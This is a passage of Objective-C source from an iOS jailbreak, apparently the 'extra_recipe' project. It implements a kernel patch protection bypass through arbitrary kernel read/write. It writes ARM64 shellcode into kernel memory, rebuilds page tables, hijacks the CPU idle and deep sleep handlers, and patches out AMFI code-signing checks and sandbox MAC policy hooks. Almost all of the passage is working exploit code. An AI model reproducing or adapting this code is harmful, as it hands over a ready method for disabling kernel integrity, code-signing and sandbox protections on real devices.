//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//  Copyright © 2017 qwertyoruiop. All rights reserved.
//

#include "unjail.h"
#include "extra_offsets.h"
#include "offsets.h"
#include "libjb.h"

// @qwertyoruiop's KPP bypass

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

struct mac_policy_ops{
    uint64_t mpo_audit_check_postselect;
    uint64_t mpo_audit_check_preselect;
    uint64_t mpo_bpfdesc_label_associate;
    uint64_t mpo_bpfdesc_label_destroy;
    uint64_t mpo_bpfdesc_label_init;
    uint64_t mpo_bpfdesc_check_receive;
    uint64_t mpo_cred_check_label_update_execve;
    uint64_t mpo_cred_check_label_update;
    uint64_t mpo_cred_check_visible;
    uint64_t mpo_cred_label_associate_fork;
    uint64_t mpo_cred_label_associate_kernel;
    uint64_t mpo_cred_label_associate;
    uint64_t mpo_cred_label_associate_user;
    uint64_t mpo_cred_label_destroy;
    uint64_t mpo_cred_label_externalize_audit;
    uint64_t mpo_cred_label_externalize;
    uint64_t mpo_cred_label_init;
    uint64_t mpo_cred_label_internalize;
    uint64_t mpo_cred_label_update_execve;
    uint64_t mpo_cred_label_update;
    uint64_t mpo_devfs_label_associate_device;
    uint64_t mpo_devfs_label_associate_directory;
    uint64_t mpo_devfs_label_copy;
    uint64_t mpo_devfs_label_destroy;
    uint64_t mpo_devfs_label_init;
    uint64_t mpo_devfs_label_update;
    uint64_t mpo_file_check_change_offset;
    uint64_t mpo_file_check_create;
    uint64_t mpo_file_check_dup;
    uint64_t mpo_file_check_fcntl;
    uint64_t mpo_file_check_get_offset;
    uint64_t mpo_file_check_get;
    uint64_t mpo_file_check_inherit;
    uint64_t mpo_file_check_ioctl;
    uint64_t mpo_file_check_lock;
    uint64_t mpo_file_check_mmap_downgrade;
    uint64_t mpo_file_check_mmap;
    uint64_t mpo_file_check_receive;
    uint64_t mpo_file_check_set;
    uint64_t mpo_file_label_init;
    uint64_t mpo_file_label_destroy;
    uint64_t mpo_file_label_associate;
    uint64_t mpo_ifnet_check_label_update;
    uint64_t mpo_ifnet_check_transmit;
    uint64_t mpo_ifnet_label_associate;
    uint64_t mpo_ifnet_label_copy;
    uint64_t mpo_ifnet_label_destroy;
    uint64_t mpo_ifnet_label_externalize;
    uint64_t mpo_ifnet_label_init;
    uint64_t mpo_ifnet_label_internalize;
    uint64_t mpo_ifnet_label_update;
    uint64_t mpo_ifnet_label_recycle;
    uint64_t mpo_inpcb_check_deliver;
    uint64_t mpo_inpcb_label_associate;
    uint64_t mpo_inpcb_label_destroy;
    uint64_t mpo_inpcb_label_init;
    uint64_t mpo_inpcb_label_recycle;
    uint64_t mpo_inpcb_label_update;
    uint64_t mpo_iokit_check_device;
    uint64_t mpo_ipq_label_associate;
    uint64_t mpo_ipq_label_compare;
    uint64_t mpo_ipq_label_destroy;
    uint64_t mpo_ipq_label_init;
    uint64_t mpo_ipq_label_update;
    uint64_t mpo_file_check_library_validation;
    uint64_t mpo_vnode_notify_setacl;
    uint64_t mpo_vnode_notify_setattrlist;
    uint64_t mpo_vnode_notify_setextattr;
    uint64_t mpo_vnode_notify_setflags;
    uint64_t mpo_vnode_notify_setmode;
    uint64_t mpo_vnode_notify_setowner;
    uint64_t mpo_vnode_notify_setutimes;
    uint64_t mpo_vnode_notify_truncate;
    uint64_t mpo_mbuf_label_associate_bpfdesc;
    uint64_t mpo_mbuf_label_associate_ifnet;
    uint64_t mpo_mbuf_label_associate_inpcb;
    uint64_t mpo_mbuf_label_associate_ipq;
    uint64_t mpo_mbuf_label_associate_linklayer;
    uint64_t mpo_mbuf_label_associate_multicast_encap;
    uint64_t mpo_mbuf_label_associate_netlayer;
    uint64_t mpo_mbuf_label_associate_socket;
    uint64_t mpo_mbuf_label_copy;
    uint64_t mpo_mbuf_label_destroy;
    uint64_t mpo_mbuf_label_init;
    uint64_t mpo_mount_check_fsctl;
    uint64_t mpo_mount_check_getattr;
    uint64_t mpo_mount_check_label_update;
    uint64_t mpo_mount_check_mount;
    uint64_t mpo_mount_check_remount;
    uint64_t mpo_mount_check_setattr;
    uint64_t mpo_mount_check_stat;
    uint64_t mpo_mount_check_umount;
    uint64_t mpo_mount_label_associate;
    uint64_t mpo_mount_label_destroy;
    uint64_t mpo_mount_label_externalize;
    uint64_t mpo_mount_label_init;
    uint64_t mpo_mount_label_internalize;
    uint64_t mpo_netinet_fragment;
    uint64_t mpo_netinet_icmp_reply;
    uint64_t mpo_netinet_tcp_reply;
    uint64_t mpo_pipe_check_ioctl;
    uint64_t mpo_pipe_check_kqfilter;
    uint64_t mpo_pipe_check_label_update;
    uint64_t mpo_pipe_check_read;
    uint64_t mpo_pipe_check_select;
    uint64_t mpo_pipe_check_stat;
    uint64_t mpo_pipe_check_write;
    uint64_t mpo_pipe_label_associate;
    uint64_t mpo_pipe_label_copy;
    uint64_t mpo_pipe_label_destroy;
    uint64_t mpo_pipe_label_externalize;
    uint64_t mpo_pipe_label_init;
    uint64_t mpo_pipe_label_internalize;
    uint64_t mpo_pipe_label_update;
    uint64_t mpo_policy_destroy;
    uint64_t mpo_policy_init;
    uint64_t mpo_policy_initbsd;
    uint64_t mpo_policy_syscall;
    uint64_t mpo_system_check_sysctlbyname;
    uint64_t mpo_proc_check_inherit_ipc_ports;
    uint64_t mpo_vnode_check_rename;
    uint64_t mpo_kext_check_query;
    uint64_t mpo_iokit_check_nvram_get;
    uint64_t mpo_iokit_check_nvram_set;
    uint64_t mpo_iokit_check_nvram_delete;
    uint64_t mpo_proc_check_expose_task;
    uint64_t mpo_proc_check_set_host_special_port;
    uint64_t mpo_proc_check_set_host_exception_port;
    uint64_t mpo_exc_action_check_exception_send;
    uint64_t mpo_exc_action_label_associate;
    uint64_t mpo_exc_action_label_copy;
    uint64_t mpo_exc_action_label_destroy;
    uint64_t mpo_exc_action_label_init;
    uint64_t mpo_exc_action_label_update;
    uint64_t mpo_reserved1;
    uint64_t mpo_reserved2;
    uint64_t mpo_reserved3;
    uint64_t mpo_reserved4;
    uint64_t mpo_reserved5;
    uint64_t mpo_reserved6;
    uint64_t mpo_posixsem_check_create;
    uint64_t mpo_posixsem_check_open;
    uint64_t mpo_posixsem_check_post;
    uint64_t mpo_posixsem_check_unlink;
    uint64_t mpo_posixsem_check_wait;
    uint64_t mpo_posixsem_label_associate;
    uint64_t mpo_posixsem_label_destroy;
    uint64_t mpo_posixsem_label_init;
    uint64_t mpo_posixshm_check_create;
    uint64_t mpo_posixshm_check_mmap;
    uint64_t mpo_posixshm_check_open;
    uint64_t mpo_posixshm_check_stat;
    uint64_t mpo_posixshm_check_truncate;
    uint64_t mpo_posixshm_check_unlink;
    uint64_t mpo_posixshm_label_associate;
    uint64_t mpo_posixshm_label_destroy;
    uint64_t mpo_posixshm_label_init;
    uint64_t mpo_proc_check_debug;
    uint64_t mpo_proc_check_fork;
    uint64_t mpo_proc_check_get_task_name;
    uint64_t mpo_proc_check_get_task;
    uint64_t mpo_proc_check_getaudit;
    uint64_t mpo_proc_check_getauid;
    uint64_t mpo_proc_check_getlcid;
    uint64_t mpo_proc_check_mprotect;
    uint64_t mpo_proc_check_sched;
    uint64_t mpo_proc_check_setaudit;
    uint64_t mpo_proc_check_setauid;
    uint64_t mpo_proc_check_setlcid;
    uint64_t mpo_proc_check_signal;
    uint64_t mpo_proc_check_wait;
    uint64_t mpo_proc_label_destroy;
    uint64_t mpo_proc_label_init;
    uint64_t mpo_socket_check_accept;
    uint64_t mpo_socket_check_accepted;
    uint64_t mpo_socket_check_bind;
    uint64_t mpo_socket_check_connect;
    uint64_t mpo_socket_check_create;
    uint64_t mpo_socket_check_deliver;
    uint64_t mpo_socket_check_kqfilter;
    uint64_t mpo_socket_check_label_update;
    uint64_t mpo_socket_check_listen;
    uint64_t mpo_socket_check_receive;
    uint64_t mpo_socket_check_received;
    uint64_t mpo_socket_check_select;
    uint64_t mpo_socket_check_send;
    uint64_t mpo_socket_check_stat;
    uint64_t mpo_socket_check_setsockopt;
    uint64_t mpo_socket_check_getsockopt;
    uint64_t mpo_socket_label_associate_accept;
    uint64_t mpo_socket_label_associate;
    uint64_t mpo_socket_label_copy;
    uint64_t mpo_socket_label_destroy;
    uint64_t mpo_socket_label_externalize;
    uint64_t mpo_socket_label_init;
    uint64_t mpo_socket_label_internalize;
    uint64_t mpo_socket_label_update;
    uint64_t mpo_socketpeer_label_associate_mbuf;
    uint64_t mpo_socketpeer_label_associate_socket;
    uint64_t mpo_socketpeer_label_destroy;
    uint64_t mpo_socketpeer_label_externalize;
    uint64_t mpo_socketpeer_label_init;
    uint64_t mpo_system_check_acct;
    uint64_t mpo_system_check_audit;
    uint64_t mpo_system_check_auditctl;
    uint64_t mpo_system_check_auditon;
    uint64_t mpo_system_check_host_priv;
    uint64_t mpo_system_check_nfsd;
    uint64_t mpo_system_check_reboot;
    uint64_t mpo_system_check_settime;
    uint64_t mpo_system_check_swapoff;
    uint64_t mpo_system_check_swapon;
    uint64_t mpo_reserved7;
    uint64_t mpo_sysvmsg_label_associate;
    uint64_t mpo_sysvmsg_label_destroy;
    uint64_t mpo_sysvmsg_label_init;
    uint64_t mpo_sysvmsg_label_recycle;
    uint64_t mpo_sysvmsq_check_enqueue;
    uint64_t mpo_sysvmsq_check_msgrcv;
    uint64_t mpo_sysvmsq_check_msgrmid;
    uint64_t mpo_sysvmsq_check_msqctl;
    uint64_t mpo_sysvmsq_check_msqget;
    uint64_t mpo_sysvmsq_check_msqrcv;
    uint64_t mpo_sysvmsq_check_msqsnd;
    uint64_t mpo_sysvmsq_label_associate;
    uint64_t mpo_sysvmsq_label_destroy;
    uint64_t mpo_sysvmsq_label_init;
    uint64_t mpo_sysvmsq_label_recycle;
    uint64_t mpo_sysvsem_check_semctl;
    uint64_t mpo_sysvsem_check_semget;
    uint64_t mpo_sysvsem_check_semop;
    uint64_t mpo_sysvsem_label_associate;
    uint64_t mpo_sysvsem_label_destroy;
    uint64_t mpo_sysvsem_label_init;
    uint64_t mpo_sysvsem_label_recycle;
    uint64_t mpo_sysvshm_check_shmat;
    uint64_t mpo_sysvshm_check_shmctl;
    uint64_t mpo_sysvshm_check_shmdt;
    uint64_t mpo_sysvshm_check_shmget;
    uint64_t mpo_sysvshm_label_associate;
    uint64_t mpo_sysvshm_label_destroy;
    uint64_t mpo_sysvshm_label_init;
    uint64_t mpo_sysvshm_label_recycle;
    uint64_t mpo_reserved8;
    uint64_t mpo_reserved9;
    uint64_t mpo_vnode_check_getattr;
    uint64_t mpo_mount_check_snapshot_create;
    uint64_t mpo_mount_check_snapshot_delete;
    uint64_t mpo_vnode_check_clone;
    uint64_t mpo_proc_check_get_cs_info;
    uint64_t mpo_proc_check_set_cs_info;
    uint64_t mpo_iokit_check_hid_control;
    uint64_t mpo_vnode_check_access;
    uint64_t mpo_vnode_check_chdir;
    uint64_t mpo_vnode_check_chroot;
    uint64_t mpo_vnode_check_create;
    uint64_t mpo_vnode_check_deleteextattr;
    uint64_t mpo_vnode_check_exchangedata;
    uint64_t mpo_vnode_check_exec;
    uint64_t mpo_vnode_check_getattrlist;
    uint64_t mpo_vnode_check_getextattr;
    uint64_t mpo_vnode_check_ioctl;
    uint64_t mpo_vnode_check_kqfilter;
    uint64_t mpo_vnode_check_label_update;
    uint64_t mpo_vnode_check_link;
    uint64_t mpo_vnode_check_listextattr;
    uint64_t mpo_vnode_check_lookup;
    uint64_t mpo_vnode_check_open;
    uint64_t mpo_vnode_check_read;
    uint64_t mpo_vnode_check_readdir;
    uint64_t mpo_vnode_check_readlink;
    uint64_t mpo_vnode_check_rename_from;
    uint64_t mpo_vnode_check_rename_to;
    uint64_t mpo_vnode_check_revoke;
    uint64_t mpo_vnode_check_select;
    uint64_t mpo_vnode_check_setattrlist;
    uint64_t mpo_vnode_check_setextattr;
    uint64_t mpo_vnode_check_setflags;
    uint64_t mpo_vnode_check_setmode;
    uint64_t mpo_vnode_check_setowner;
    uint64_t mpo_vnode_check_setutimes;
    uint64_t mpo_vnode_check_stat;
    uint64_t mpo_vnode_check_truncate;
    uint64_t mpo_vnode_check_unlink;
    uint64_t mpo_vnode_check_write;
    uint64_t mpo_vnode_label_associate_devfs;
    uint64_t mpo_vnode_label_associate_extattr;
    uint64_t mpo_vnode_label_associate_file;
    uint64_t mpo_vnode_label_associate_pipe;
    uint64_t mpo_vnode_label_associate_posixsem;
    uint64_t mpo_vnode_label_associate_posixshm;
    uint64_t mpo_vnode_label_associate_singlelabel;
    uint64_t mpo_vnode_label_associate_socket;
    uint64_t mpo_vnode_label_copy;
    uint64_t mpo_vnode_label_destroy;
    uint64_t mpo_vnode_label_externalize_audit;
    uint64_t mpo_vnode_label_externalize;
    uint64_t mpo_vnode_label_init;
    uint64_t mpo_vnode_label_internalize;
    uint64_t mpo_vnode_label_recycle;
    uint64_t mpo_vnode_label_store;
    uint64_t mpo_vnode_label_update_extattr;
    uint64_t mpo_vnode_label_update;
    uint64_t mpo_vnode_notify_create;
    uint64_t mpo_vnode_check_signature;
    uint64_t mpo_vnode_check_uipc_bind;
    uint64_t mpo_vnode_check_uipc_connect;
    uint64_t mpo_proc_check_run_cs_invalid;
    uint64_t mpo_proc_check_suspend_resume;
    uint64_t mpo_thread_userret;
    uint64_t mpo_iokit_check_set_properties;
    uint64_t mpo_system_check_chud;
    uint64_t mpo_vnode_check_searchfs;
    uint64_t mpo_priv_check;
    uint64_t mpo_priv_grant;
    uint64_t mpo_proc_check_map_anon;
    uint64_t mpo_vnode_check_fsgetpath;
    uint64_t mpo_iokit_check_open;
    uint64_t mpo_proc_check_ledger;
    uint64_t mpo_vnode_notify_rename;
    uint64_t mpo_vnode_check_setacl;
    uint64_t mpo_vnode_notify_deleteextattr;
    uint64_t mpo_system_check_kas_info;
    uint64_t mpo_proc_check_cpumon;
    uint64_t mpo_vnode_notify_open;
    uint64_t mpo_system_check_info;
    uint64_t mpo_pty_notify_grant;
    uint64_t mpo_pty_notify_close;
    uint64_t mpo_vnode_find_sigs;
    uint64_t mpo_kext_check_load;
    uint64_t mpo_kext_check_unload;
    uint64_t mpo_proc_check_proc_info;
    uint64_t mpo_vnode_notify_link;
    uint64_t mpo_iokit_check_filter_properties;
    uint64_t mpo_iokit_check_get_property;
};

#define ReadAnywhere32 kread_uint32
#define WriteAnywhere32 kwrite_uint32
#define ReadAnywhere64 kread_uint64
#define WriteAnywhere64 kwrite_uint64

#define copyin(to, from, size) kread(from, to, size)
#define copyout(to, from, size) kwrite(to, from, size)

#import "pte_stuff.h"

#include "patchfinder64.h"

static void
kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide)
{
    checkvad();
    
    uint64_t entryp;
    
    int rv = init_kernel(kernbase, NULL);
    assert(rv == 0);
    
    uint64_t gStoreBase = find_gPhysBase();
    
    gPhysBase = ReadAnywhere64(gStoreBase);
    gVirtBase = ReadAnywhere64(gStoreBase+8);
    
    entryp = find_entry() + slide;
    uint64_t rvbar = entryp & (~0xFFF);
    
    uint64_t cpul = find_register_value(rvbar+0x40, 1);
    
    uint64_t optr = find_register_value(rvbar+0x50, 20);
    if (uref) {
        optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
    }
    NSLog(@"%llx", optr);
    
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);
    
    uint64_t pmap_store = find_kernel_pmap();
    NSLog(@"pmap: %llx", pmap_store);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
    
    
    
    
    uint64_t shellcode = physalloc(0x4000);
    
    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */
    
    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);
    
    uint64_t physcode = findphys_real(shellcode);
    
    
    
    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
    
    uint64_t idlesleep_handler = 0;
    
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;
    
    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            NSLog(@"already jailbroken, bailing out");
            return;
        }
        
        
        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
            
            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
            
            
            uint32_t* opcz = malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
            
            
        }
        
        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
        
        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }
    
    
    uint64_t shc = physalloc(0x4000);
    
    uint64_t regi = find_register_value(idlesleep_handler+12, 30);
    uint64_t regd = find_register_value(idlesleep_handler+24, 30);
    
    NSLog(@"%llx - %llx", regi, regd);
    
    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);
    }
    
    /*
     isvad 0 == 0x4000
     */
    
    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
    
    NSLog(@"ttbr0: %llx %llx",ReadAnywhere64(ttbr0_real), ttbr0_real);
    
    char* bbuf = malloc(0x4000);
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t physp = findphys_real(level0_pte);
    
    
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    
    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        int n = 0;
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr	w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str		w8, [x23]
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov	 x0, xzr
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub	sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp	x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp	x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp	x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp	x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp	x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
        
    }
    
    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;
        
        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr	x1, #60
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr	x0, #40
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi	vae1, x30 (16k)
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }
    
    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
    
    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
    
    /*
     
     pagetables are now not real anymore, they're real af
     
     */
    
    uint64_t cpacr_addr = find_cpacr_write();
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)
    
    
#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
uint64_t tte = ReadAnywhere64(tte_addr);\
if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
NSLog(@"breakup!");\
uint64_t fakep = physalloc(PSZ);\
uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
TTE_SETB(tte, TTE_IS_TABLE_MASK);\
for (int i = 0; i < PSZ/8; i++) {\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
WriteAnywhere64(fakep+i*8, tte);\
}\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
WriteAnywhere64(tte_addr, tte);\
}\
uint64_t newt = physalloc(PSZ);\
copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
copyout(newt, bbuf, PSZ);\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
WriteAnywhere64(tte_addr, tte);\
}, level1_table, isvad ? 1 : 2);
    
#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
    
    uint64_t* remappage = calloc(512, 8);
    
    int remapcnt = 0;
    
    
#define RemapPage(x)\
{\
int fail = 0;\
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
if (fail == 0) {\
RemapPage_(x);\
RemapPage_(x+PSZ);\
remappage[remapcnt++] = (x & (~PMK));\
}\
}
    
    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
    
    
    uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(cpacr_addr);
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
    
    RemapPage(shtramp);
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
    
    uint64_t lwvm_write = find_lwvm_mapio_patch();
    uint64_t lwvm_value = find_lwvm_mapio_newj();
    RemapPage(lwvm_write);
    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
    
    
    uint64_t kernvers = find_str("Darwin Kernel Version");
    uint64_t release = find_str("RELEASE_ARM");
    
    RemapPage(kernvers-4);
    WriteAnywhere32(NewPointer(kernvers-4), 1);
    
    RemapPage(release);
    if (NewPointer(release) == (NewPointer(release+11) - 11)) {
        copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
    }
    
    
    /*
     nonceenabler
     */
    
    {
        uint64_t sysbootnonce = find_sysbootnonce();
        NSLog(@"%x", ReadAnywhere32(sysbootnonce));
                    
        WriteAnywhere32(sysbootnonce, 1);
    }
    
    
    
    uint64_t memcmp_got = find_amfi_memcmpstub();
    uint64_t ret1 = find_ret_0();
    
    RemapPage(memcmp_got);
    WriteAnywhere64(NewPointer(memcmp_got), ret1);
    
    uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
    NSLog(@"fref at %llx", fref);
    
    uint64_t amfiops = find_amfiops();
    
    NSLog(@"amfistr at %llx", amfiops);
    
    
    {
        /*
         amfi
         */
        
        uint64_t sbops = amfiops;
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
        
        uint64_t nopag = sbops_end - sbops;
        
        for (int i = 0; i < nopag; i+= PSZ) {
            RemapPage(((sbops + i) & (~PMK)));
        }
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    }
    
    
    /*
     first str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x200);
            break;
        }
        fref += 4;
    }
    
    fref += 4;
    
    /*
     second str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x100);
            break;
        }
        fref += 4;
    }
    
    if (nukesb) {
        /*
         sandbox
         */
        
        uint64_t sbops = find_sbops();
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
        
        uint64_t nopag = (sbops_end - sbops)/(PSZ);
        
        for (int i = 0; i < nopag; i++) {
            RemapPage(((sbops + i*(PSZ)) & (~PMK)));
        }
        
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
